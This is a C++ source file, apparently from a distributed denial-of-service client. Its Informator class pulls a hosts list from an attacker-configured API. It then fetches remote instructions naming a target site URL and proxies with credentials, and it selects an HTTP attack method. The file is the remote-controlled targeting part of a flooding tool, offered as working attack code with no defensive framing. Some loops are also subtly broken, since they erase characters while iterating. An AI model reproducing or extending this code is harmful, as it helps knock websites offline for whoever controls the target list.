#include <iostream>

#include "api_interface.h"
#include "config.h"
#include "curl_wrapper.h"
#include "utils.h"

void Informator::LoadResouces() noexcept
{
	nlohmann::json hostsData;
	auto wrapper = CURLLoader();

	// Getting hosts list
	wrapper.SetTarget(AttackerConfig::APIS_LIST);
	while(true)
	{
		if(auto resp = wrapper.Download();
			resp->m_code >= 200 && resp->m_code < 300)
		{
			try
			{
				hostsData = nlohmann::json::parse(resp->m_data);
			}
			catch(...)
			{
				std::cerr << "Failed to parse hosts list" << std::endl;
			}
			break;
		}
		else
		{
			std::cerr << "Failed to load hosts list!" << std::endl;
			std::this_thread::sleep_for(std::chrono::milliseconds(500));
			std::cerr << "Trying again to load hosts" << std::endl;
		}
	}

	m_availableResources.reserve(hostsData.size());
	for(auto uri : hostsData)
	{
		m_availableResources.push_back(uri);
	}
	std::cout << "Succesfully got APIs" << std::endl;
}

Informator::Informator()
{
	std::call_once(m_loadResourcesFlag, LoadResouces);
}

bool Informator::LoadNewData() noexcept
{
	const std::string apiURI{ChoseAPI(m_availableResources)};

	CURLLoader apiDownloader;
	apiDownloader.SetTarget(apiURI);

	std::cout << "Loading API response from: " << apiURI << std::endl;
	if(auto resp = apiDownloader.Download())
	{
		if(resp->m_code >= 200 && resp->m_code < 300)
		{
			resp->m_data.push_back('\0');
			try
			{
				m_data = nlohmann::json::parse(resp->m_data.data());
				return true;
			}
			catch(...)
			{
				std::cerr << "Failed to parse API:" << std::endl << resp->m_data.data() << std::endl;
				return false;
			}
		}
	}
	std::cerr << "Failed to load API" << std::endl;
	return false;
}

std::optional<std::vector<Proxy>> Informator::GetProxies() const noexcept
{
	if(!m_isValid || !m_data.contains("proxy"))
	{
		return {};
	}
	
	std::vector<Proxy> proxies;
	proxies.reserve(m_data["proxy"].size());

	std::pair<std::string, std::string> proxyVal;
	for(auto proxy : m_data["proxy"])
	{
		if(!proxy.contains("ip"))
		{
			continue;
		}
		proxyVal.first = proxy["ip"];
		for(auto iter = std::begin(proxyVal.first); iter != std::end(proxyVal.first); iter++)
		{
			if(*iter == '\r' || *iter == '\n')
			{
				proxyVal.first.erase(iter);
			}
		}

		if(proxy.contains("auth"))
		{
			proxyVal.second = proxy["auth"];
			for(auto iter = std::begin(proxyVal.second); iter != std::end(proxyVal.second); iter++)
			{
				if(*iter == '\r' || *iter == '\n')
				{
					proxyVal.second.erase(iter);
				}
			}
		}

		proxies.push_back(std::move(proxyVal));
	}

	return proxies;
}

std::optional<std::string> Informator::GetTarget() const noexcept
{
	
	if(m_data.contains("site") && m_data["site"].contains("url"))
	{
		return decodeURL(m_data["site"]["url"]);
	}

	return {};
}

std::optional<Informator::AttackMethod> Informator::GetMethod() const noexcept
{
	return AttackMethod::HTTPAttack;
}
